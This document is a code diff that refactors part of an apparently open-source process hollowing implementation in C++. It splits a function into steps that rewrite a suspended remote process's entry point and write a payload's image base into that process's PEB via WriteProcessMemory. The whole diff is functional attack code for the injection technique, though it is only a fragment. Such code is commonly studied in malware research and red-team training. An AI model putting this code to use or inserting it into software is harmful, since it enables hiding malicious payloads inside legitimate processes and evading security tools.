@@ -1,7 +1,7 @@
 #include "hollowing_parts.h"
 #include <iostream>
 
-BOOL update_remote_entry_point(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va, bool is32bit)
+BOOL update_remote_entry_point_in_ctx(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va, bool is32bit)
 {
 #ifdef _DEBUG
     std::cout << "Writing new EP: " << std::hex << entry_point_va << std::endl;
@@ -98,30 +98,35 @@ inline ULONGLONG get_img_base_peb_offset(bool is32bit)
     return img_base_offset;
 }
 
-bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, bool is32bit)
+bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi, bool is32bit)
 {
     //1. Calculate VA of the payload's EntryPoint
     DWORD ep = get_entry_point_rva(loaded_pe);
     ULONGLONG ep_va = (ULONGLONG)load_base + ep;
 
     //2. Write the new Entry Point into context of the remote process:
-    if (update_remote_entry_point(pi, ep_va, is32bit) == FALSE) {
+    if (update_remote_entry_point_in_ctx(pi, ep_va, is32bit) == FALSE) {
         std::cerr << "Cannot update remote EP!\n";
         return false;
     }
-    //3. Get access to the remote PEB:
+    return true;
+}
+
+bool set_new_image_base(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi, bool is32bit)
+{
+    // 1. Get access to the remote PEB:
     ULONGLONG remote_peb_addr = get_remote_peb_addr(pi, is32bit);
     if (!remote_peb_addr) {
         std::cerr << "Failed getting remote PEB address!\n";
         return false;
     }
-    // get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
+    // 2. get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
     LPVOID remote_img_base = (LPVOID)(remote_peb_addr + get_img_base_peb_offset(is32bit));
     //calculate size of the field (depends on architecture):
     const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);
 
     SIZE_T written = 0;
-    //4. Write the payload's ImageBase into remote process' PEB:
+    // 3. Write the payload's ImageBase into remote process' PEB:
     if (!WriteProcessMemory(pi.hProcess, remote_img_base,
         &load_base, img_base_size,
         &written))
@@ -129,5 +134,12 @@ bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &
         std::cerr << "Cannot update ImageBaseAddress!\n";
         return false;
     }
+    return true;
+}
+
+bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, bool is32bit)
+{
+    if (!redirect_entry_point(loaded_pe, load_base, pi, is32bit)) return false;
+    if (!set_new_image_base(loaded_pe, load_base, pi, is32bit)) return false;
     return true;
 }
